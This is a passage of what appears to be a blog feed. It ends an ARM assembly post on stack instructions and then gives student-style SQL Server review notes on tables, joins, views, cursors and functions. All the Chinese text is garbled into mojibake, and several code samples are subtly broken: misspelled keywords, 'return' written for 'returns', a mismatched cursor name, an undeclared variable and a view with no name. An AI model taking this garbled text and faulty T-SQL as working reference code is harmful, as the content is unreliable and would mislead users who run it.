R4,PC</code>ï¼Œè¿™æ˜¯STMFDçš„é€†æŒ‡ä»¤ã€‚ä¸ºäº†å°†åˆå§‹å€¼å­˜å…¥<code>R4</code>å’Œ<code>PC</code>å¯„å­˜å™¨é‡Œï¼Œè¿™æ¡æŒ‡ä»¤ä¼šä»æ ˆä¸Š(æˆ–ä»»ä½•å…¶ä»–çš„å†…å­˜åŒºåŸŸ)è¯»å–ä¿å­˜çš„å€¼ï¼Œå¹¶ä¸”å¢åŠ å †æ ˆæŒ‡é’ˆ<code>SP</code>çš„å€¼ã€‚è¿™éå¸¸ç±»ä¼¼x86å¹³å°é‡Œçš„<code>POP</code>æŒ‡ä»¤ã€‚</p><p>æœ€å‰é¢é‚£æ¡<code>STMFD</code>æŒ‡ä»¤ï¼Œå°†<code>R4</code>ï¼Œå’Œ<code>LR</code>å¯„å­˜å™¨æˆå¯¹ä¿å­˜åˆ°æ ˆä¸­ã€‚åœ¨<code>LDMFD</code>æ‰§è¡Œçš„æ—¶å€™ï¼Œ<code>R4</code>å’Œ<code>PC</code>ä¼šè¢«å¤åŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®åº“å¤ä¹ ç¬”è®°</title>
    <link href="/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/01/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>ä½¿ç”¨çš„æ˜¯sql serverï¼Œæ“ä½œå¯èƒ½è·Ÿmysqlæœ‰åŒºåˆ«</strong></p><h2 id="æ–°å»ºæ•°æ®åº“"><a href="#æ–°å»ºæ•°æ®åº“" class="headerlink" title="æ–°å»ºæ•°æ®åº“"></a>æ–°å»ºæ•°æ®åº“</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create database stuhyy<br>on <br>(<br>name &#x3D; stu, <br>filename&#x3D;&#39;C:\stu_data.mdf&#39;,<br>size &#x3D; 3mb,<br>maxsize &#x3D; 500mb,<br>filegrowth &#x3D; 10%<br><br>)<br>log on<br>(<br>name &#x3D; stu_log,<br>filename &#x3D; &#39;D:\stu_log.ldf&#39;,<br>size&#x3D;3mb,<br>maxsize &#x3D; unlimited,<br>filegrowth &#x3D; 1mb<br>)<br></code></pre></td></tr></table></figure><h2 id="ä¿®æ”¹æ•°æ®åº“"><a href="#ä¿®æ”¹æ•°æ®åº“" class="headerlink" title="ä¿®æ”¹æ•°æ®åº“"></a>ä¿®æ”¹æ•°æ®åº“</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter database Stuhyy<br>Modify file<br>(<br>    name &#x3D; Stuhyy_log,<br>    filename &#x3D; &#39;H:\Stuhyy_log.ldf&#39;,<br>    size &#x3D; 10MB,<br>    maxsize &#x3D; 20MB,<br>    fileGrowth &#x3D; 5%<br>)<br></code></pre></td></tr></table></figure><h2 id="æ·»åŠ æ•°æ®åº“æ–‡ä»¶"><a href="#æ·»åŠ æ•°æ®åº“æ–‡ä»¶" class="headerlink" title="æ·»åŠ æ•°æ®åº“æ–‡ä»¶"></a>æ·»åŠ æ•°æ®åº“æ–‡ä»¶</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter database Stuhyy<br>add file<br>(<br>    name &#x3D; dataname,<br>    filename &#x3D; &#39;H:\dataname.ndf&#39;,<br>    size &#x3D; 20MB,<br>    maxsize &#x3D; 30MB,<br>    filegrowth &#x3D; 1MB<br>)<br></code></pre></td></tr></table></figure><h2 id="æ–°å»º-amp-ä¿®æ”¹æ•°æ®è¡¨"><a href="#æ–°å»º-amp-ä¿®æ”¹æ•°æ®è¡¨" class="headerlink" title="æ–°å»º&amp;ä¿®æ”¹æ•°æ®è¡¨"></a>æ–°å»º&amp;ä¿®æ”¹æ•°æ®è¡¨</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Table Student<br>(<br>    Num int primary key,<br>    Nam char(6) not null,<br>    Birthday datetime<br>)<br>Create Table ChoseClass<br>(<br>    Num int primary key,<br>    CNum int not null,<br>    Score int not null.<br>    check (100&gt;&#x3D; Score and Score &gt;&#x3D; 0)<br>)<br>Alter Table Student<br>add å­¦åˆ† int<br>ALTER TABLE table_name <br>DROP COLUMN column_name<br></code></pre></td></tr></table></figure><h3 id="æ·»åŠ å¤–é”®çº¦æŸ"><a href="#æ·»åŠ å¤–é”®çº¦æŸ" class="headerlink" title="æ·»åŠ å¤–é”®çº¦æŸ"></a>æ·»åŠ å¤–é”®çº¦æŸ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter Table Student<br>Add Constraint fk_stuNum<br>Foreign key(Num) references ChoseClass(Num)<br></code></pre></td></tr></table></figure><h2 id="æ’å…¥ä¿¡æ¯"><a href="#æ’å…¥ä¿¡æ¯" class="headerlink" title="æ’å…¥ä¿¡æ¯"></a>æ’å…¥ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Insert Into studinfo<br>Values(&#39;hyy&#39;,&#39;11&#39;ï¼Œ&#39;å¹¿ä¸œ&#39;)<br></code></pre></td></tr></table></figure><h2 id="åˆ é™¤ä¿¡æ¯"><a href="#åˆ é™¤ä¿¡æ¯" class="headerlink" title="åˆ é™¤ä¿¡æ¯"></a>åˆ é™¤ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Delete From sc<br>where xxx &#x3D; xxx<br></code></pre></td></tr></table></figure><h2 id="å¤‡ä»½æ•°æ®åº“"><a href="#å¤‡ä»½æ•°æ®åº“" class="headerlink" title="å¤‡ä»½æ•°æ®åº“"></a>å¤‡ä»½æ•°æ®åº“</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Backup database Stuhyy to disk &#x3D; &#39;H:\StuhyyBackup.bak&#39;<br>&#x2F;&#x2F;&#x2F;Backup database Stuhyy to StuhyyBak<br>Backup log Stuhyy_log to disk &#x3D; &#39;H:\Stuhyy_logBackup.bak&#39;<br>&#x2F;&#x2F;&#x2F;Backup log Stuhyy_log to Stuhyy_log<br></code></pre></td></tr></table></figure><h2 id="æ¢å¤"><a href="#æ¢å¤" class="headerlink" title="æ¢å¤"></a>æ¢å¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Restore Database Stuhyy from disk &#x3D; &#39;H:\StuhyyBackup.bak&#39;<br></code></pre></td></tr></table></figure><p><code>Select Distinct å­¦å· from sc</code></p><h2 id="å¯¹æˆç»©è¿›è¡Œé™åº-ç›¸åŒåˆ™æŒ‰å­¦å·å‡åºæ’åº"><a href="#å¯¹æˆç»©è¿›è¡Œé™åº-ç›¸åŒåˆ™æŒ‰å­¦å·å‡åºæ’åº" class="headerlink" title="å¯¹æˆç»©è¿›è¡Œé™åº,ç›¸åŒåˆ™æŒ‰å­¦å·å‡åºæ’åº"></a>å¯¹æˆç»©è¿›è¡Œé™åº,ç›¸åŒåˆ™æŒ‰å­¦å·å‡åºæ’åº</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select å­¦å·,æˆç»© From sc<br>Where è¯¾ç¨‹å· &#x3D; &#39;4&#39;<br>Order by æˆç»© desc,å­¦å· asc<br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢å§“é»„åŒå­¦çš„ä¿¡æ¯"><a href="#æŸ¥è¯¢å§“é»„åŒå­¦çš„ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢å§“é»„åŒå­¦çš„ä¿¡æ¯"></a>æŸ¥è¯¢å§“é»„åŒå­¦çš„ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select å§“å, ç³»éƒ¨åç§° From Studinfo<br>Where å§“å like &#39;å’©%&#39; and ç³»éƒ¨åç§° in (&#39;å›½ä¼ &#39;,&#39;åª’ä½“å·¥ç¨‹&#39;) <br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢é€‰ä¿®äººæ•°è¶…è¿‡10äººçš„è¯¾ç¨‹å·"><a href="#æŸ¥è¯¢é€‰ä¿®äººæ•°è¶…è¿‡10äººçš„è¯¾ç¨‹å·" class="headerlink" title="æŸ¥è¯¢é€‰ä¿®äººæ•°è¶…è¿‡10äººçš„è¯¾ç¨‹å·"></a>æŸ¥è¯¢é€‰ä¿®äººæ•°è¶…è¿‡10äººçš„è¯¾ç¨‹å·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select è¯¾ç¨‹å·,Count(*) as é€‰è¯¾äººæ•°  From sc<br>Group By è¯¾ç¨‹å·<br>Having Count (*) &gt; 10<br></code></pre></td></tr></table></figure><h2 id="æŸ¥è¯¢æ¯é—¨è¯¾æœ€é«˜åˆ†ï¼Œæœ€ä½åˆ†"><a href="#æŸ¥è¯¢æ¯é—¨è¯¾æœ€é«˜åˆ†ï¼Œæœ€ä½åˆ†" class="headerlink" title="==æŸ¥è¯¢æ¯é—¨è¯¾æœ€é«˜åˆ†ï¼Œæœ€ä½åˆ†=="></a>==æŸ¥è¯¢æ¯é—¨è¯¾æœ€é«˜åˆ†ï¼Œæœ€ä½åˆ†==</h2><h2 id="æŸ¥è¯¢é€‰ä¿®äº†è¯¾ç¨‹çš„å­¦ç”Ÿå§“ååŠé€‰ä¿®è¯¾ç¨‹çš„æœ€é«˜åˆ†"><a href="#æŸ¥è¯¢é€‰ä¿®äº†è¯¾ç¨‹çš„å­¦ç”Ÿå§“ååŠé€‰ä¿®è¯¾ç¨‹çš„æœ€é«˜åˆ†" class="headerlink" title="æŸ¥è¯¢é€‰ä¿®äº†è¯¾ç¨‹çš„å­¦ç”Ÿå§“ååŠé€‰ä¿®è¯¾ç¨‹çš„æœ€é«˜åˆ†"></a>æŸ¥è¯¢é€‰ä¿®äº†è¯¾ç¨‹çš„å­¦ç”Ÿå§“ååŠé€‰ä¿®è¯¾ç¨‹çš„æœ€é«˜åˆ†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select Studinfo.å§“å,Max(sc.æˆç»©) as æœ€é«˜æˆç»© From sc<br>Right Outer Join Studinfo on Studinfo.å­¦å· &#x3D; sc.å­¦å·<br>Group by Studinfo.å§“å<br></code></pre></td></tr></table></figure><h2 id="right-outer-join-left-inner-join"><a href="#right-outer-join-left-inner-join" class="headerlink" title="==right outer join  left inner join=="></a>==right outer join  left inner join==</h2><p>ã€€ã€€left join(å·¦è”æ¥) è¿”å›åŒ…æ‹¬<strong>å·¦è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå³è¡¨ä¸­è”ç»“å­—æ®µç›¸ç­‰</strong>çš„è®°å½•  ä»¥å·¦è¡¨ä¸ºä¸»<br>ã€€ã€€right join(å³è”æ¥) è¿”å›åŒ…æ‹¬<strong>å³è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå·¦è¡¨ä¸­è”ç»“å­—æ®µç›¸ç­‰</strong>çš„è®°å½• ä»¥å³è¡¨ä¸ºä¸»<br>ã€€ã€€inner join(ç­‰å€¼è¿æ¥) åªè¿”å›ä¸¤ä¸ªè¡¨ä¸­è”ç»“å­—æ®µç›¸ç­‰çš„è¡Œ</p><blockquote><p>   outer join(å¤–è¿æ¥) å¯åˆ†ä¸ºå·¦å¤–è¿æ¥left outer joinå’Œå³å¤–è¿æ¥right outer join</p><p>left join æ˜¯ left outer join çš„ç®€å†™ï¼Œä¸¤è€…å«ä¹‰ä¸€æ ·çš„ã€‚<br>right join æ˜¯ right outer join çš„ç®€å†™ï¼Œä¸¤è€…å«ä¹‰ä¸€æ ·çš„</p></blockquote><h2 id="T-sqlåˆ›å»ºå­¦ç”Ÿè§†å›¾"><a href="#T-sqlåˆ›å»ºå­¦ç”Ÿè§†å›¾" class="headerlink" title="T-sqlåˆ›å»ºå­¦ç”Ÿè§†å›¾"></a>T-sqlåˆ›å»ºå­¦ç”Ÿè§†å›¾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create View AS<br>Select Studinfo.å­¦å·ï¼ŒStudinfo.ç³»éƒ¨åç§°,Course.è¯¾ç¨‹åï¼ŒSc.æˆç»© From Studinfo,sc,Course<br>Where Studinfo.å­¦å· &#x3D; sc.å­¦å· And sc.è¯¾ç¨‹å· &#x3D; course.è¯¾ç¨‹å· <br>And Studinfo.ç³»éƒ¨åç§° &#x3D; &#39;åª’ä½“å·¥ç¨‹&#39;<br>With Check Option<br></code></pre></td></tr></table></figure><blockquote><p>å¯¹è§†å›¾è¿›è¡Œupdateæˆ–è€…insertæ“ä½œæ—¶ï¼Œä¿è¯æ›´æ–°æˆ–è€…æ’å…¥çš„è¡Œæ»¡è¶³å›¾ä¸­å®šä¹‰çš„è°“è¯æ¡ä»¶ å‡å¦‚ä¸€å¼ è¡¨é‡Œæœ‰ä¸ªå­—æ®µæ˜¯ä¸“ä¸šçš„;ä½ åˆ›å»ºè§†å›¾çš„æ—¶å€™ create view stu as select å­¦ç”Ÿ from table where ä¸“ä¸š=â€™è®¡ç®—æœºâ€™ with check option è¿™æ ·whereåé¢å°±å®ç°äº†å¯¹ä¸“ä¸šçš„é™å®š ä»¥åä½ å¦‚æœå¯¹è§†å›¾æ·»åŠ è®°å½•çš„æ—¶å€™ä¸“ä¸šå¦‚æœä¸æ˜¯è®¡ç®—æœºçš„è¯ä¸è®©æ·»åŠ è¿›å»çš„<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€ŒClearLoveQã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/ClearLoveQ/article/details/84285060">https://blog.csdn.net/ClearLoveQ/article/details/84285060</a></p></blockquote><h2 id="å£°æ˜å±€éƒ¨å˜é‡"><a href="#å£°æ˜å±€éƒ¨å˜é‡" class="headerlink" title="å£°æ˜å±€éƒ¨å˜é‡"></a>å£°æ˜å±€éƒ¨å˜é‡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare @max date , @min date<br>set @max &#x3D; (select Max(å‡ºç”Ÿæ—¥æœŸ) from studinfo)<br>set @min &#x3D; (select Min(å‡ºç”Ÿæ—¥æœŸ) from studinfo)<br>select @max as æœ€å¤§å‡ºç”Ÿæ—¥æœŸ , @min as æœ€å°å‡ºç”Ÿæ—¥æœŸ<br></code></pre></td></tr></table></figure><p>å°çŸ¥è¯†</p><blockquote><p>â‘ dateç±»å‹å¯ç”¨äºéœ€è¦ä¸€ä¸ªæ—¥æœŸå€¼è€Œä¸éœ€è¦æ—¶é—´éƒ¨åˆ†æ—¶ï¼›</p><p>â‘¡datetimeç±»å‹:å¯ç”¨äºéœ€è¦åŒæ—¶åŒ…å«æ—¥æœŸå’Œæ—¶é—´ä¿¡æ¯çš„å€¼ã€‚</p></blockquote><h2 id="Caseçš„ä½¿ç”¨"><a href="#Caseçš„ä½¿ç”¨" class="headerlink" title="Caseçš„ä½¿ç”¨"></a>Caseçš„ä½¿ç”¨</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Select å§“å,è¯¾ç¨‹å,æˆç»© &#x3D;<br>Case<br>when æˆç»© &gt; 90 then &#39;A&#39;<br>when æˆç»© &gt; 80 then &#39;B&#39;<br>when æˆç»© &gt; 70 then &#39;C&#39;<br>when æˆç»© &gt; 60 then &#39;D&#39;<br>else &#39;E&#39;<br>End<br>From sc<br>inner join studinfo on sc.å­¦å· &#x3D; studinfo.å­¦å·<br>inner join course on sc.è¯¾ç¨‹å· &#x3D; course.è¯¾ç¨‹å·<br><br>&#x2F;&#x2F;&#x2F;å¦‚æœå­˜åœ¨<br>If Exists(select * from studinfo)<br>select * from studinfo<br></code></pre></td></tr></table></figure><h2 id="å£°æ˜æ¸¸æ ‡ï¼Œæ›´æ–°å­—æ®µ"><a href="#å£°æ˜æ¸¸æ ‡ï¼Œæ›´æ–°å­—æ®µ" class="headerlink" title="å£°æ˜æ¸¸æ ‡ï¼Œæ›´æ–°å­—æ®µ"></a>å£°æ˜æ¸¸æ ‡ï¼Œæ›´æ–°å­—æ®µ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare curor_mark Cursor<br>For select æˆç»© from sc<br>For Update of æˆç»©<br>Go<br><br>&#x2F;&#x2F;&#x2F;åˆ é™¤æ¸¸æ ‡<br>Deallocate curor_mark<br></code></pre></td></tr></table></figure><h2 id="æ¸¸æ ‡å®šä½æ“ä½œ"><a href="#æ¸¸æ ‡å®šä½æ“ä½œ" class="headerlink" title="æ¸¸æ ‡å®šä½æ“ä½œ"></a>æ¸¸æ ‡å®šä½æ“ä½œ</h2><p>å®šä¹‰åŸºäºscçš„æ¸¸æ ‡ï¼Œåˆ†åˆ«å°†ç¬¬ä¸‰æ¡è®°å½•ï¼Œä»å½“å‰è®°å½•å¼€å§‹å‘å‰ç¬¬äºŒæ¡è®°å½•å’Œæœ€åä¸€æ¡è®°å½•æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare cursor_mark Cursor Scroll<br>For<br>Select * from sc<br>inner join studinfo on sc.å­¦å· &#x3D; Studinfo.å­¦å·<br>inner join course on course.è¯¾ç¨‹å· &#x3D; sc.è¯¾ç¨‹å·<br>Open course_mark<br>fetch absolute 3 from cursor_mark<br>fetch relative -2 from cursor_mark<br>fetch last from cursor_mark<br>Close cursor_mark<br>Deallocate cursor_mark<br></code></pre></td></tr></table></figure><h2 id="æ¸¸æ ‡éå†scè¡¨ï¼Œå°†å­¦å·ä¸ºâ€œ1001â€çš„å­¦ç”Ÿçš„æ‰€æœ‰è¯¾ç¨‹æˆç»©åŠ 5åˆ†"><a href="#æ¸¸æ ‡éå†scè¡¨ï¼Œå°†å­¦å·ä¸ºâ€œ1001â€çš„å­¦ç”Ÿçš„æ‰€æœ‰è¯¾ç¨‹æˆç»©åŠ 5åˆ†" class="headerlink" title="æ¸¸æ ‡éå†scè¡¨ï¼Œå°†å­¦å·ä¸ºâ€œ1001â€çš„å­¦ç”Ÿçš„æ‰€æœ‰è¯¾ç¨‹æˆç»©åŠ 5åˆ†"></a>æ¸¸æ ‡éå†scè¡¨ï¼Œå°†å­¦å·ä¸ºâ€œ1001â€çš„å­¦ç”Ÿçš„æ‰€æœ‰è¯¾ç¨‹æˆç»©åŠ 5åˆ†</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Declare @name char(20), @num int<br>Declare cursor_mark Cursor Scroll<br>For<br>Select å§“å,sc.å­¦å· from sc<br>inner join studinfo on sc.å­¦å· &#x3D; studinfo.å­¦å·<br>inner join course on course.è¯¾ç¨‹å· &#x3D; sc.è¯¾ç¨‹å·<br>For Update of æˆç»©<br>Open cursor_mark<br>Fetch Next from cursor_mark Into @name , @num<br>while @@fetch_status &#x3D; 0<br>Begin<br>if @name &#x3D; &#39;å¥³æœ‹å‹&#39;<br>Update sc<br>set æˆç»© &#x3D; æˆç»© + 5<br>where current of cursor_mark<br>Fetch Next from cursor_mark Into @name , @num<br>End<br>Close cursor_mark<br>Deallocate cursor_mark<br></code></pre></td></tr></table></figure><h2 id="ç»™scè¡¨å¢åŠ ä¸€åˆ—å­—æ®µï¼šç­‰çº§ï¼Œcharï¼ˆ2ï¼‰ï¼Œåˆ©ç”¨æ¸¸æ ‡æ“ä½œæœºåˆ¶ç»™ç­‰çº§å­—æ®µèµ‹å€¼ï¼Œå¦‚æœscore-gt-60åˆ™ä¸ºâ€œPâ€ï¼Œå¦åˆ™ä¸ºâ€œFâ€"><a href="#ç»™scè¡¨å¢åŠ ä¸€åˆ—å­—æ®µï¼šç­‰çº§ï¼Œcharï¼ˆ2ï¼‰ï¼Œåˆ©ç”¨æ¸¸æ ‡æ“ä½œæœºåˆ¶ç»™ç­‰çº§å­—æ®µèµ‹å€¼ï¼Œå¦‚æœscore-gt-60åˆ™ä¸ºâ€œPâ€ï¼Œå¦åˆ™ä¸ºâ€œFâ€" class="headerlink" title="ç»™scè¡¨å¢åŠ ä¸€åˆ—å­—æ®µï¼šç­‰çº§ï¼Œcharï¼ˆ2ï¼‰ï¼Œåˆ©ç”¨æ¸¸æ ‡æ“ä½œæœºåˆ¶ç»™ç­‰çº§å­—æ®µèµ‹å€¼ï¼Œå¦‚æœscore&gt;60åˆ™ä¸ºâ€œPâ€ï¼Œå¦åˆ™ä¸ºâ€œFâ€"></a>ç»™scè¡¨å¢åŠ ä¸€åˆ—å­—æ®µï¼šç­‰çº§ï¼Œcharï¼ˆ2ï¼‰ï¼Œåˆ©ç”¨æ¸¸æ ‡æ“ä½œæœºåˆ¶ç»™ç­‰çº§å­—æ®µèµ‹å€¼ï¼Œå¦‚æœscore&gt;60åˆ™ä¸ºâ€œPâ€ï¼Œå¦åˆ™ä¸ºâ€œFâ€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Alter Table sc<br>Add ç­‰çº§ char(2) null<br>Go<br>Begin<br>Update sc<br>set ç­‰çº§ &#x3D; <br>Case<br>when æˆç»© &gt;&#x3D; 60 then &#39;P&#39;<br>when æˆç»© &lt; 60 then &#39;F&#39;<br>End<br>End<br></code></pre></td></tr></table></figure><p>==dateadd(year,1,å‡ºç”Ÿæ—¥æœŸ) å‡ºç”Ÿæ—¥æœŸçš„year + 1==</p><p>==month(å‡ºç”Ÿæ—¥æœŸ) å–å‡ºç”Ÿæ—¥æœŸçš„monthå‡ºæ¥==</p><h2 id="å®šä¹‰æ ‡é‡å‡½æ•°f-stud1-ç»Ÿè®¡æŸå­¦é™¢çš„å­¦ç”Ÿäººæ•°"><a href="#å®šä¹‰æ ‡é‡å‡½æ•°f-stud1-ç»Ÿè®¡æŸå­¦é™¢çš„å­¦ç”Ÿäººæ•°" class="headerlink" title="==å®šä¹‰æ ‡é‡å‡½æ•°f_stud1,ç»Ÿè®¡æŸå­¦é™¢çš„å­¦ç”Ÿäººæ•°=="></a>==å®šä¹‰æ ‡é‡å‡½æ•°f_stud1,ç»Ÿè®¡æŸå­¦é™¢çš„å­¦ç”Ÿäººæ•°==</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mssql">If Exists(select * from sysobjects where name &#x3D; &#39;f_stud1&#39;)<br>drop function f_stud1<br>Go<br>Create Function f_stud1(@nam char(10))<br>return int<br>AS<br>Begin<br>Declare @n int<br>set @n &#x3D; (select count(*) from studinfo<br>                 where ç³»éƒ¨åç§° &#x3D; @nam)<br>        return (@n)<br>    End<br>Go<br><br>Select dbo.f_stud1(&#39;åª’ä½“å·¥ç¨‹&#39;) as äººæ•°<br></code></pre></td></tr></table></figure><h2 id="å®šä¹‰ä¸€-å†…åµŒè¡¨å€¼å‡½æ•°-f-stud3ï¼Œè¿”å›æŸå­¦ç”Ÿé€‰ä¿®è¯¾æƒ…å†µï¼ŒåŒ…å«å§“åã€è¯¾ç¨‹åï¼Œåˆ†æ•°ç­‰"><a href="#å®šä¹‰ä¸€-å†…åµŒè¡¨å€¼å‡½æ•°-f-stud3ï¼Œè¿”å›æŸå­¦ç”Ÿé€‰ä¿®è¯¾æƒ…å†µï¼ŒåŒ…å«å§“åã€è¯¾ç¨‹åï¼Œåˆ†æ•°ç­‰" class="headerlink" title="å®šä¹‰ä¸€==å†…åµŒè¡¨å€¼å‡½æ•°==f_stud3ï¼Œè¿”å›æŸå­¦ç”Ÿé€‰ä¿®è¯¾æƒ…å†µï¼ŒåŒ…å«å§“åã€è¯¾ç¨‹åï¼Œåˆ†æ•°ç­‰"></a>å®šä¹‰ä¸€==å†…åµŒè¡¨å€¼å‡½æ•°==f_stud3ï¼Œè¿”å›æŸå­¦ç”Ÿé€‰ä¿®è¯¾æƒ…å†µï¼ŒåŒ…å«å§“åã€è¯¾ç¨‹åï¼Œåˆ†æ•°ç­‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mssql">Create Function f_stud3(@name nchar(10))<br>return Table<br>As<br>return (select å§“å ,è¯¾ç¨‹å,æˆç»© from sc s<br>           inner join studinfo on s.å­¦å· &#x3D; studinfo.å­¦å·<br>           inner join course on s.å­¦å· &#x3D; course.å­¦å·<br>           where å§“å &#x3D; @nam)<br>Go<br><br>selet * from dbo.f_stud3(&#39;Mie&#39;)<br></code></pre></td></tr></table></figure><h2 